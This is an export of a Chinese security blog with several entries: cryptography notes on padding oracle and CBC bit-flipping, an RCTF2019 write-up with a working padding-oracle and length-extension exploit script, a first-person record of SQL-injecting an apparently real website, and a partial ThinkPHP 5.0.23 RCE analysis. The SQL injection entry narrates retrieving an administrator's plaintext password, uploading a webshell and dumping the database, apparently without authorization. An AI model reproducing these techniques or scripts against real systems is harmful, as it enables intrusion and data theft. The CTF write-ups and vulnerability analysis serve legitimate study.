<p>以此类推, 可以解出全部的明文, 同时, 有了中间值, 我们也可以通过修改前一块的数据来伪造数据, 比如要伪造 ‘a’, 只要将 <code>中间值 ^ ord(&#39;a&#39;)</code> 的结果作为前一块对应位置的数据即可. 然后将前一块作为最后一块, 再去爆破中间值. 最后可以伪造任意数据.</p>
<p>最后再来说说 CBC 字节翻转, 其实原理也是一样的, 通过修改前一块的数据, 不过这次是取 <code>前一块对应的密文 ^ 后一块对应的明文 ^ 你想要伪造的数据</code> 的结果. 不过需要注意的是这样将会使得<code>前一块密文</code>的解密结果异常, 具体解密出来是啥得看运气 233, 不过大概率是乱码. 当然, 如果只有一块密文或者我们修改的是第一块密文, 我们修改的将会是 IV, 这样可以使结果完全可控.</p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2019 baby_crypto &amp; baby_aes</title>
    <url>/2019/05/22/RCTF2019-baby-crypto-baby-aes-Writeup/</url>
    <content><![CDATA[<p>密码学只做出来两题 baby, 暗示我还是学密码学的 baby (逃</p>
<a id="more"></a>

<h2 id="baby-crypto"><a href="#baby-crypto" class="headerlink" title="baby_crypto"></a>baby_crypto</h2><p>这题还算比较常规, 主要逻辑如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">"Input your cookie:"</span>)</span><br><span class="line">        data_hex = sys.stdin.readline().strip()</span><br><span class="line">        data = binascii.unhexlify(data_hex)</span><br><span class="line">        <span class="keyword">assert</span>(len(data) &gt; iv_len + hash_len)</span><br><span class="line">        iv, cookie_padded_encrypted, hv = data[:iv_len], data[iv_len: -hash_len], data[-hash_len:]</span><br><span class="line">        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line">        cookie_padded = decryptor.update(cookie_padded_encrypted) + decryptor.finalize()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cookie = unpad(cookie_padded)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"Invalid padding"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_hash(cookie, hv):</span><br><span class="line">            print(<span class="string">"Invalid hash"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        info = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> cookie.split(<span class="string">b";"</span>):</span><br><span class="line">            k, v = _.split(<span class="string">b":"</span>)</span><br><span class="line">            info[k] = v</span><br><span class="line">        <span class="keyword">if</span> info[<span class="string">b"admin"</span>] == <span class="string">b"1"</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"flag"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                print(<span class="string">"Your flag: %s"</span> %flag)</span><br></pre></td></tr></table></figure>

<p>很明显的看到可以 <code>padding oracle</code>, 只要满足 <code>info[b&quot;admin&quot;] == b&quot;1&quot;</code> 就可以拿到 <code>flag</code>,<br>但在 <code>cookie</code> 后面设置了 hash 来效验 <code>cookie</code> 的有效性, 但是没有检测重复的键值<br>所以这里可以结合长度扩展攻击, 我们假设 <code>cookie</code> 为 <code>admin:0;username:abcde;password:abcde</code><br>我们可以在原 <code>cookie</code> 后面添加一个 <code>;admin:1</code>, 得到<br><code>admin:0;username:abcde;password:abcde\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\xa8;admin:1</code>,<br>因为顺序的关系, 这将覆盖之前的值, 从而满足条件. 脚本如下<br>一开始没有国内的服务器, 写完下午睡了一觉起来才跑完 233</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> remotecli <span class="comment"># https://github.com/rmb122/remoteCLI</span></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(byte)</span>:</span></span><br><span class="line">    padlen = <span class="number">16</span> - len(byte) % <span class="number">16</span></span><br><span class="line">    byte += bytearray([padlen] * padlen)</span><br><span class="line">    <span class="keyword">return</span> byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addIvLastByte</span><span class="params">(iv, currIndex, midval)</span>:</span></span><br><span class="line">    target = <span class="number">16</span> + <span class="number">1</span> - currIndex</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(currIndex, <span class="number">16</span>):</span><br><span class="line">        iv[i] = midval[i] ^ target</span><br><span class="line">    <span class="keyword">return</span> iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        result.append(a[i] ^ b[i])</span><br><span class="line">    result = bytearray(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">cli = remotecli.CLI()</span><br><span class="line">cli.connect(<span class="string">'207.148.68.109'</span>, <span class="number">20000</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line">cli.sendLine(<span class="string">'abcde'</span>)</span><br><span class="line"></span><br><span class="line">hv_hex_len = <span class="number">40</span></span><br><span class="line">iv_len = <span class="number">16</span></span><br><span class="line">orgCookie = <span class="string">'admin:0;username:abcde;password:abcde'</span></span><br><span class="line"></span><br><span class="line">cookie = cli.recvLinesUntilHave(<span class="string">'Input your cookie:'</span>)[<span class="number">-2</span>]</span><br><span class="line">print(cookie)</span><br><span class="line">hv_hex = cookie[-hv_hex_len:]</span><br><span class="line">iv = cookie[:iv_len]</span><br><span class="line">cookieEnc = cookie[iv_len: - hv_hex_len]</span><br><span class="line"></span><br><span class="line">fakeHash, fakeCookie = hashpumpy.hashpump(hv_hex, orgCookie, <span class="string">';admin:1'</span>, iv_len)</span><br><span class="line">print(fakeCookie)</span><br><span class="line">print(fakeHash)</span><br><span class="line"></span><br><span class="line">fakeHash = bytearray(unhexlify(fakeHash))</span><br><span class="line">fakeCookie = padding(fakeCookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(fakeCookie) == <span class="number">64</span></span><br><span class="line">dummy = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(fakeCookie) + <span class="number">16</span>)]) <span class="comment"># iv + cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">64</span> + <span class="number">16</span>, <span class="number">16</span>, -iv_len):</span><br><span class="line">    curr = dummy[pos - iv_len:pos]</span><br><span class="line">    iv = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    midval = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(iv_len)])</span><br><span class="line">    <span class="keyword">for</span> currIndex <span class="keyword">in</span> range(<span class="number">0</span>, iv_len)[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">0</span>, <span class="number">256</span>)):</span><br><span class="line">            iv[currIndex] = i</span><br><span class="line">            cli.sendLine(hexlify(iv + curr + fakeHash))</span><br><span class="line">            res = cli.recvline()</span><br><span class="line">            <span class="comment">#print(res)</span></span><br><span class="line">            cli.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Invalid padding"</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">                midval[currIndex] = (<span class="number">16</span> - currIndex) ^ iv[currIndex]</span><br><span class="line">                <span class="keyword">if</span> currIndex == <span class="number">0</span>:</span><br><span class="line">                    tmp = xor(midval, fakeCookie[pos-iv_len*<span class="number">2</span>:pos-iv_len])</span><br><span class="line">                    <span class="keyword">for</span> tmpPos <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">                        dummy[pos-iv_len*<span class="number">2</span> + tmpPos] = tmp[tmpPos]</span><br><span class="line">                iv = addIvLastByte(iv, currIndex, midval)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cli.sendLine(hexlify(dummy + fakeHash))</span><br><span class="line">cli.console()</span><br></pre></td></tr></table></figure>


<h2 id="baby-aes"><a href="#baby-aes" class="headerlink" title="baby_aes"></a>baby_aes</h2><p>这题比较有意思, 操作还是比较硬核的, 主要逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">Ke = init(K)</span><br><span class="line"></span><br><span class="line">backend = default_backend()</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = encrypt(key, Ke)</span><br><span class="line">cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)</span><br><span class="line">decryptor = cipher.decryptor()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">"Input a hexstr to decrypt:"</span>)</span><br><span class="line">    data = sys.stdin.readline().strip()</span><br><span class="line">    ciphertext = binascii.unhexlify(data)</span><br><span class="line">    plaintext = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    print(<span class="string">"Decrypted result:"</span>)</span><br><span class="line">    print(binascii.hexlify(plaintext).decode())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">    padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">    flag_padded = padder.update(flag) + padder.finalize()</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    flag_encrypted = encryptor.update(flag_padded) + encryptor.finalize()</span><br><span class="line">    print(<span class="string">"Your encrypted flag is:"</span>)</span><br><span class="line">    print(binascii.hexlify(flag_encrypted).decode())</span><br></pre></td></tr></table></figure>

<p>其中 <code>init</code> 函数是 AES 秘钥扩展, <code>encrypt</code> 是 AES 轮函数, 但是改变了 AES 原来的常数, 这两个函数也是本题的核心, 我们留到后面讲. 这里假设我们已经写出对应的解密函数,</p>
<p>看到 <code>iv = encrypt(key, Ke)</code>, 可以看到 iv 就是 key 的加密, 只要我们能获得 <code>iv</code>, 就能解密出 <code>key</code>, 从而解密得到 <code>flag</code>.</p>
<p>注意到这里是用 AES 解密输入的数据, 结合 CBC 模式</p>
<p><img src="https://i.loli.net/2019/05/19/5ce17ac53478934702.png" alt="CBC"></p>
<p>我们可以输入两个相同分块(b1 + b1’)长度的数据, 其中解密结果的第二块(o2)是这样算出来的<br><code>xor(AESdec(b1&#39;), b1) = o2</code><br>而 <code>o2</code>, <code>b1</code> 都是已知的, 我们就可以解出 <code>AESdec(b1)</code>, 因为我们输入的两个分块相同,<br>我们将 <code>AESdec(b1)</code> 与 <code>o1</code> xor 一下, 就能得到 <code>iv</code>, 这时只要用 <code>K</code> 解密 <code>iv</code> 就能得到 <code>key</code><br>从而解密 <code>flag</code>.</p>
<p>但问题就是这里出题人魔改了 AES, 不能直接解密, 这里最好自己写过一遍 AES 的实现, 否则接下来有些部分可能不太方便,<br>首先可以搜到作者魔改的<a href="https://github.com/ricmoo/pyaes/blob/master/pyaes/aes.py" target="_blank" rel="noopener">原代码</a><br>可以看到 Sbox, T1-4 都被修改, 并且没有给出对应的逆变换</p>
<p><code>S = [0x63, 0x7c, 0x77, 0x7....</code> &lt;-原来的<br><code>S = [0x93 ,0x43 ,0x5D ,0x6....</code> &lt;-魔改之后的</p>
<p>但是从 <code>rcon = [....0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91 ]</code> 这最后几个<br>数据可以看出, 仍然还是在 <code>GF(2^8) mod x^8 + x^4 + x^3 + x + 1</code> 上的, 否则 0xc5 * 2 不会等于 0x91</p>
<p>所以这里应该只是单纯的改了 Sbox, 不是改其他常数带来的副作用.</p>
<p>接下来可以看到 T 被完全修改了, 首先了解一下 T 变换是干嘛的,<br>这里借一张图说明<br><img src="https://i.loli.net/2019/05/22/5ce5502037ede37184.png" alt=""></p>
<p>注: ShiftRow 与 ByteSub 之间的顺序不敏感, 可以在进入变换之前就 ShiftRow 好, 就跟上图一样, 取的不是原矩阵的一行, 而是 ShiftRow 之后矩阵的一行</p>
<p>T 变换是结合了 ByteSub MixColumn, 将 AES 轮函数中的两步并到一起, 加速效率的一种方法, 如果按照原来的矩阵乘法<br><img src="https://i.loli.net/2019/05/22/5ce551bb6234249389.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d0 &#x3D; 2 * ByteSub(b0) + 3 * ByteSub(b1) + 1 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d1 &#x3D; 1 * ByteSub(b0) + 2 * ByteSub(b1) + 3 * ByteSub(b2) + 1 * ByteSub(b3)</span><br><span class="line">d2 &#x3D; 1 * ByteSub(b0) + 1 * ByteSub(b1) + 2 * ByteSub(b2) + 3 * ByteSub(b3)</span><br><span class="line">d3 &#x3D; 3 * ByteSub(b0) + 1 * ByteSub(b1) + 1 * ByteSub(b2) + 2 * ByteSub(b3)</span><br></pre></td></tr></table></figure>
<p>算起来非常的麻烦, 但是看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">1 * ByteSub(b0)</span><br><span class="line">3 * ByteSub(b0)</span><br></pre></td></tr></table></figure>

<p>可以想到这结构完全是固定的, 因为加密的是字节, 定义域是 0-255, 完全可以将 0-255 的值带入 b0, 将所有值提前算出, 并成 4 个字节, 在使用时查表就行, 大大提高效率. 因为 GF(2^8) 上的加法实际上就是 xor, 所以</p>
<p><code>MixColumn(ByteSub(b0 b1 b2 b3)) = T1[b0] xor T2[b1] xor T3[b2] xor T4[b3]</code></p>
<p>在本题中, 假设进入轮函数之前 state 全是 0, 那么这里查表可以直接一步到位 <code>T1[0] ^ T2[0] ^ T3[0] ^ T4[0] = 0xaeaeaeae</code>, 而按照原列混合的矩阵算等于 <code>0x93939393</code> 说明列混合的矩阵也被修改, 这就比较麻烦了, 需要用一下 <code>sage</code>.</p>
<p>因为假设输入轮函数的 state 全是 0， 那么 subByte 的得到的是 0x93, 而 <code>T[0] = 0xF467D4E9</code>, 原 AES 的因数是 <code>(2, 3, 1, 1)</code>, 这里我们假设魔改之后的是 <code>(cofe[0], cofe[1], cofe[2], cofe[3])</code></p>
<p>按照上面 T 变换的定义, <code>T[0]</code> 是这么来的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cofe[0] * b0</span><br><span class="line">cofe[3] * b0</span><br><span class="line">cofe[2] * b0</span><br><span class="line">cofe[1] * b0</span><br></pre></td></tr></table></figure>

<p>而本题 <code>T[0] = 0xF467D4E9</code> 可以写出<br><code>0x93 * cofe[0] = 0xF4</code>,  <code>0x93 * cofe[3] = 0x67</code>, <code>0x93 * cofe[2] = 0xD4</code>, <code>0x93 * cofe[1] = 0xE9</code>,<br>在 0-255 的范围内爆破下,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sage: F.&lt;x&gt; &#x3D; GF(2^8, modulus&#x3D;[1,1,0,1,1,0,0,0,1])</span><br><span class="line">sage: F.modulus()</span><br><span class="line">x^8 + x^4 + x^3 + x + 1</span><br><span class="line">sage: def f(num):</span><br><span class="line">....:     global F</span><br><span class="line">....:     return F.fetch_int(num)</span><br><span class="line">....:</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xf4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">8</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0x67):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">9</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xd4):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">7</span><br><span class="line">sage: for i in range(0,256):</span><br><span class="line">....:     if f(0x93)*f(i)&#x3D;&#x3D;f(0xe9):</span><br><span class="line">....:         print(i)</span><br><span class="line">....:</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<p>那么四个因数是 <code>(8, 5, 7, 9)</code>, 还原成矩阵求 GF(2^8) 上的逆矩阵, 再用一下 <code>sage</code>, 当然如果是大佬可以手算 _(:з」∠)_</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sage: c &#x3D; matrix(F, [[f(8), f(5), f(7), f(9)], [f(9), f(8), f(5), f(7)], [f(7), f(9), f(8), f(5)], [f(5), f(7), f(9), f(8)]])</span><br><span class="line">sage: c.inverse()</span><br><span class="line">[      x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1]</span><br><span class="line">[x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1]</span><br><span class="line">[      x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x           x^7 + x^6 + x^3]</span><br><span class="line">[          x^7 + x^6 + x^3       x^7 + x^4 + x^2 + 1 x^5 + x^4 + x^3 + x^2 + 1       x^7 + x^4 + x^2 + x]</span><br></pre></td></tr></table></figure>
<p>转换回数字表示就是<br><code>cofes = (150, 200, 149, 61)</code><br>带进 invMixColumn 就可以正确解密啦, 如果没有自己写过的话, 可以参考我写的<a href="https://github.com/rmb122/Cryptography/blob/master/AES-128-CBC.py" target="_blank" rel="noopener">辣鸡实现</a><br>修改 <code>mixColumn</code> 和 <code>invMixColumn</code> 里面的 <code>polynomialMutil</code> 函数乘的数为矩阵对应位置的数就行了</p>
<p>既然现在可以解密, 按着上面的思路就能拿 <code>flag</code> 了~<br>接下来 nc 一下, 输入 16 个 1,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input a hexstr to decrypt:</span><br><span class="line">3131313131313131313131313131313131313131313131313131313131313131</span><br><span class="line">Decrypted result:</span><br><span class="line">3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c</span><br><span class="line">Your encrypted flag is:</span><br><span class="line">c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES <span class="keyword">as</span> stdAES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">K = <span class="string">b"\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10"</span></span><br><span class="line">hexstr = <span class="string">'11111111111111111111111111111111'</span>.encode()</span><br><span class="line">dec = unhexlify(<span class="string">'3205fe135b595e72c90d2613ada3087812f10dee01e66c4d1e47089a0ff0f18c'</span>)</span><br><span class="line">midVal = strxor(dec[<span class="number">16</span>:<span class="number">32</span>], hexstr[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">iv = strxor(dec[<span class="number">0</span>:<span class="number">16</span>], midVal)</span><br><span class="line">aes = AES()</span><br><span class="line">key = aes.decryptBlock(iv, K)</span><br><span class="line">print(key)</span><br><span class="line">print(iv)</span><br><span class="line">flag = unhexlify(<span class="string">'c2c06ee0e21dae7e5b64fcb84397b4ed920c28bb81a676d817a4b920564bd04dd2a570900ff2e9d5fee9cb74c37c4812'</span>)</span><br><span class="line">stdaes = stdAES.new(key, stdAES.MODE_CBC, iv)</span><br><span class="line">print(stdaes.decrypt(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'N\t\x9c\xce*\xfa\xc1\x02\x94\xd1\x02\xf2\xb8d*E'</span></span><br><span class="line"><span class="string">b'\x11\xc5\xc2\xcck\x8e\x03\x0e\xe6&#123;\x1f\xb8\x93b\xc8\xc5'</span></span><br><span class="line"><span class="string">b'RCTF&#123;88358abe-e571-4bdf-95a3-93e9d8ddf558&#125;\x06\x06\x06\x06\x06\x06'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p>这样子求解, 比直接爆破四个因数优雅很多, 而且之后遇到类似题目, 修改列混合的因数, 可以直接按照上面的方法通杀</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL 注入实战记录</title>
    <url>/2018/11/07/SQL%20%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>第一次算是独立完完整整用 SQL 注入搞下来一个站, 过程还是非常曲折的, 从希望到绝望到希望, 最后用比较猥琐的方式注入进去.  </p>
<a id="more"></a>

<p>所以来写个记录吧 233 一开始自然先是扫描器伺候, 毕竟要是万一找到一个备份就会轻松很多, 当然最后结果是啥都没有 233 剩下的因为没有账号密码登录进去, 任意文件下载, 上传等等自然也是不存在的, 于是剩下的只有 SQL 注入了, 先从最明显的开始  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827ce5927f7.jpg" alt="">  </p>
<p>fuzz 了一下, 居然直接返回了错误的 SQL 语句, 这对我们接下来的注入有非常的帮助,  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827ceab5aaa.jpg" alt="">  </p>
<p>同时也可以看出来, <code>username</code> 是开了 <code>addslashes</code> 的, 但是 <code>ix_select</code> 并没有开引号过滤, 所以我们下一个目标就是他了, 尝试用 <code>&#39; or 1=1 %23</code>  来尝试一下能否布尔注入, 但是  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827cefa5720.jpg" alt="">  </p>
<p>等待我们的却依然是一个错误, 当时我的表情  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827cf63a52c.jpg" alt="">  </p>
<p>缓过神来发现, <code>FROM</code> 后面是空的, 怪不得出现错误, 猜测后台是用 <code>ix_select</code> 从一个数组里面取出一个表名后再运行 sql 语句, 所以用 <code>ix_select</code> 注入是不行的, 会导致原本的语句出错. 继续寻找下一个目标, 发现一个搜索页   </p>
<p><img src="https://i.loli.net/2019/03/08/5c827cfa55678.jpg" alt="">  </p>
<p>尝试注入  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827cfe30b29.jpg" alt="">  </p>
<p>又是没有过滤, 惊了, 这个居然都不过滤, 尝试用 <code>sqlmap</code> 直接布尔注入, 如果注入结果为真, 将会返回 <code>7条记录</code>, 为假, 返回 <code>0条记录</code>  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d05985ae.jpg" alt="">  </p>
<p>注入成功, 能读取数据库名和版本号~ 但是正当我兴奋以为拿下一血时, 现实却打了我一个狠狠的脸, 不能正常 <code>SELECT</code> 数据, 连 <code>SELECT</code> 一个 <code>1</code> 也不行, 肿么肥事! 赶紧打开 <code>wireshark</code> 看看出了啥幺蛾子  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d09a8e41.jpg" alt="">  </p>
<p>SQL 语句居然是错误的, 然而仔细看看, 明明没有错误(毕竟工具自动生成的), 而且除了 <code>SELECT</code> 以外, 其他的函数都可以用, 比如 <code>rand()</code>, 都能正常输出结果. 我突然想起来, 看了下版本  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d0e83875.jpg" alt="">  </p>
<p>卧槽… <code>4.0.15</code>, 我马上去官网上翻了一下  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d12d36f4.jpg" alt="">  </p>
<p>连归档中的最远古版本都是 <code>5.0.15</code>… 可想而知这个 <code>4.0.15</code> 是多老的版本, 估计不支持这种多重 <code>SELECT</code>  查询, 看来不能用布尔注入了 尝试了下 <code>UNION SELECT</code>, 居然能用, 看来还有希望, 但是上面和这个都无法使用, 因为要满足 <code>count(*)</code>, 只能有一列, 而下面从数据库中查表依然用的同一个参数, 查出来肯定不止一列. 所以只能满足 <code>count(*)</code> 和查信息这两个语句中的一个, 无法同时满足, 只能寻找下一个可能的注入点.  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d185e8e3.jpg" alt="">  </p>
<p>中间经历了很多尝试, 发现很多很上面一样的地方, 要么不能注入, 要么就是不能布尔注入. 最后找了半天, 终于在一个猥琐的地方找到一个注入点  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d1b7bd2b.jpg" alt=""><br><img src="https://i.loli.net/2019/03/08/5c827d22bff4b.jpg" alt="">  </p>
<p>先看看 SQL 语句, 因为不能多重 <code>SELECT</code> 的关系, 所以我们只能用 <code>UNION SELECT</code> 了 这里猜测后台从表中读取数据, 并比对数据库中的问题和答案是否与提交的相同, 所以这里可以用 <code>UNION SELECT</code> 伪造数据来找回密码, 先爆破列长度  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d281f1aa.jpg" alt="">  </p>
<p>这里其实已经通过后台的逻辑了, 但是 <code>gbk</code> 真是太蛋疼了…  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d2cf267a.jpg" alt="">  </p>
<p>因为从数据库取出的答案密码是我们伪造的 1 和 1 , 与我们提交的相同, 所以取回了密码 (而且居然真的是取回而不是重置密码), 但是我们同时我们得到的密码也是我们伪造 的 1, 所以我们要先确定回显的位置  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d327d87f.jpg" alt="">  </p>
<p>然后测试一下从表中取出数据,  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d379338a.jpg" alt="">  </p>
<p>Nice! 但是比较蛋疼的是 <code>Mysql</code> 版本太老连 <code>information_schema</code> 都没有, 密码列名只好稍微手工爆破一下, 最后测出来是 <code>userpass</code>, 还好算是比较常见的… 不然就凉了  </p>
<p><img src="https://i.loli.net/2019/03/08/5c827d3c538f4.jpg" alt="">  </p>
<p>然后我们得到了… 密码的明文, 太真实了, 居然没有 <code>hash</code>, 也算节省一点工作量, 不管怎样管理员密码 GET DAZE~ 这就是注入全过程, 之后登录后台上传 <code>webshell</code>(还是师傅找到地方传的 233)、脱裤, 都是老套路不说了 233</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp &amp;#60;= 5.0.23 RCE 分析</title>
    <url>/2019/01/16/Thinkphp%20%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E%205.0.23%20RCE%20%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>起因是刚出来那天刚好有个站是 5.0.23 但是分析文章没给完整的截图, 打了码. 干脆自己分析一波写写 poc.</p>
<p><img src="https://i.loli.net/2019/03/08/5c827b967b058.jpg" alt=""></p>
<a id="more"></a>

<p>先切换到 v5.0.23</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:top-think/framework.git</span><br><span class="line">git checkout v5.0.23</span><br></pre></td></tr></table></figure>

<p>主要问题出在 <code>library/think/Request.php</code> 中的 <code>method</code>, 其中的 Config::get(‘var_method’) 默认值是 _method, 而其没有任何过滤就被传进 $this-&gt;{$this-&gt;method}($_POST) 中, 导致可以调用本类的任何单参数函数.</p>
<p><img src="https://i.loli.net/2019/03/08/5c827b9b6fbef.jpg" alt=""></p>
<p>官方的补丁也是增加过滤措施</p>
<p><img src="https://i.loli.net/2019/03/08/5c827ba0aa16d.jpg" alt=""></p>
<p>这里我反着来, 从利用链末端的危险函数 <code>filterValue</code> 开始分析,</p>
<p><img src="https://i.loli.net/2019/03/08/5c827ba5b5cb0.jpg" alt=""></p>
<p>可以看到其中调用了 call_user_func, 只要我们能控制 filters 和 value, 就能调用任意函数</p>
<p>这里查找这个方法的引用, 找到 cookie 和 input, 这里我偷懒, 直接加上 echo, 找找看是否有启用</p>
<p><img src="https://i.loli.net/2019/03/08/5c827baa8eac6.jpg" alt=""></p>
<p><img src="https://i.loli.net/2019/03/08/5c827bb04e7d4.jpg" alt=""></p>
<p><img src="https://i.loli.net/2019/03/08/5c827bb3c3fe5.jpg" alt=""></p>
<p>这里可以看到 cookie 方法并未被在框架中直接使用, 所以我们从 input 上下手</p>
<p><img src="https://i.loli.net/2019/03/08/5c827bb7efec3.jpg" alt=""></p>
<p>可以看到找到一个调用了 input 且 <code>name = &#39;&#39;</code> 的方法就行了, data 将会被作为 filterValue 中的 value.</p>
<p>继续查找引用, 这里我随便找了一个 get, var_dump 了一下确认了 <code>name =&#39;&#39;</code>. $_GET 数组将会被当做 value 传进 input.</p>
<p><img src="https://i.loli.net/2019/03/08/5c827bbc2120b.jpg" alt=""></p>
<p>这样 filterValue 中的 value 已经构造完成, 接下来只要构造 filter 即可, 这个比较简单, 在构造函数中可以看到</p>
